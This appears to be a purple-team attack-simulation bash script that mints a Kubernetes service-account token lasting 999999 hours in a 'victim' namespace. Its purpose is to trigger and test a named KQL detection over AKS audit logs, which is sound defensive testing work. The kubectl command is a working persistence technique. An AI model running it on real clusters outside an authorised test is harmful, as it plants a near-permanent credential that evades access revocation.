#!/bin/bash
# ============================================================================
# Attack Simulation: Long-Lived Service Account Token Minted
# MITRE ATT&CK: T1098 - Account Manipulation
# Stratus technique: k8s.persistence.create-token
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# Fires detection: detections/kql/create-token.kql   (table: AKSAuditAdmin)
# ============================================================================

set -e
SA="default"
NS="victim"

echo "[*] Minting a long-lived token for serviceaccount $NS/$SA via TokenRequest API..."
# serviceaccounts/token subresource — a durable credential for persistence.
kubectl create token "$SA" -n "$NS" --duration=999999h || \
  echo "[!] If this errors, your identity lacks create serviceaccounts/token — expected in a locked-down cluster."

echo ""
echo "[*] Expected detection: T1098 - Long-Lived Service Account Token Minted"
echo "[*] Expected log table: AKSAuditAdmin  (Verb=create, resource=serviceaccounts/token)"
echo "[*] No cleanup needed — the token is not stored server-side; it simply expires."
